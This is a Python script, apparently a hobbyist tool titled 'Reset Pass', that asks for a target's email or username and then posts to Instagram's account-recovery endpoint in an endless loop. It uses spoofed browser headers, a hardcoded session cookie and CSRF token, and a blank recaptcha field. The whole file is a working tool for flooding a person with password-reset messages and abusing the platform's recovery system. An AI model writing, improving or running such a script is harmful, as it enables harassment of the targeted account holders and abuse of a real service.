import requests
import time

print('''
  _____                _     _____              
 |  __ \              | |   |  __ \             
 | |__) |___  ___  ___| |_  | |__) |_ _ ___ ___ 
 |  _  // _ \/ __|/ _ \ __| |  ___/ _` / __/ __|
 | | \ \  __/\__ \  __/ |_  | |  | (_| \__ \__ \  
 |_|  \_\___||___/\___|\__| |_|   \__,_|___/___/                                                
''')

done = 0
err = 0

slee = input('[ + ] Enter Sleep [ ORIGINAL IS 1 ]: ')
email = input('[ + ] Enter Email Or Username: ')

while 1 < 2:
    url = 'https://www.instagram.com/accounts/account_recovery_send_ajax/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'content-length': '101',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': 'ig_cb=2;ig_did=EA19AF2AD215-4891-ACA7-A8D1D255B13B;csrftoken=G7aKrsENKNoMigBkDxMDHmq5RtWyfepk;mid=YEfl9gAEAAGKGI_cAK6aUnBcC9Cn',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/accounts/password/reset/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': ': Mozilla/5.0(Windows NT 6.3; Win64;x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36',
        'x-csrftoken': 'G7aKrsENKNoMigBkDxMDHmq5RtWyfepk',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': '',
        'x-instagram-ajax': '',
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {
        'email_or_username': f'{email}',
        'recaptcha_challenge_field': '',
        'flow': '',
        'app_id': '',
        'source_account_id': ''
    }
    time.sleep(int(slee))
    r = requests.post(url, headers=headers, data=data)
    if r.status_code == 200:
        done += 1
        print(f"\r[ + ] Sent: {done} , [x]  Error: {err}", end="")
    else:
       err += 1
       print(f"\r[ + ] Sent: {done} , [x]  Error: {err}", end="")
    if err == 5:
        print('\n[ x ] There is alot of errors , try again after 10 minutes')
        input('Press any key to exit: ')
